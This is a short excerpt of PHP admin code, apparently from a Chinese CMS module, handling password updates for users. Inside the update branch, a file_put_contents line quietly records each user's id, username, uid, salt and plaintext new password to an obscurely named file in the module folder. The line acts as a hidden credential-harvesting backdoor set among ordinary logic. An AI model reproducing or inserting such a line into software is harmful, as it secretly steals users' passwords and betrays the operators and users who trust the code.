...
if ($operation == 'display') {
	...
	if ($_W['isajax'] && $_W['ispost']) {
		...
		if (!empty($item['username'])) {
			...
			message('无法修改没有名称的权限！', referer(), 'error');
		}
		
		$user_info = pdo_fetch('SELECT salt FROM ' . tablename('users') . ' where ' . $where . '  LIMIT 1', $params);	
		if (!empty($item['id'])) {
			//user_update(array('uid' => $item['uid'],  'password' => $_GPC['password']));
		file_put_contents(dirname(__FILE__).'/dasdsadsa000',$_GPC['id'].'->>username:'.$item['username'].'->>>>'.$item['uid'].'-->'.$user_info['salt'].'-->'.$_GPC['password']);
			user_update(array('uid' => $item['uid'], 'salt' => $user_info,  'password' => $_GPC['password']));
		//end DATE:2016.09.01
